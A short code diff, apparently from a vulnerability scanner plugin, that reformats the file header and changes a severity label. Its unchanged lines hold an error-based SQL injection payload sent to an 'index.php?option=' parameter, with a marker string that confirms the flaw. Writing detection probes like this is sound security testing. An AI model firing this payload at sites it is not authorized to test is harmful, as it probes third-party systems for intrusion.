@@ -1,7 +1,8 @@
+# !/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 from ..miniCurl import Curl
 from ..t  import T
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 class P(T):
     def __init__(self):
@@ -14,10 +15,10 @@ class P(T):
 
         payload = 'index.php?option=(select+1+from+(select+count(*)%2cconcat((select+0x7465737476756c776b)%2cfloor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)'
         target = arg + payload
-        
+
         code, head, res, errcode, _ = curl.curl2(target);
         if 'testvulwk' in res:
-            output(target,result,'note')
+            output(target,result,'低危(NOTE)')
 
         del curl
         return result
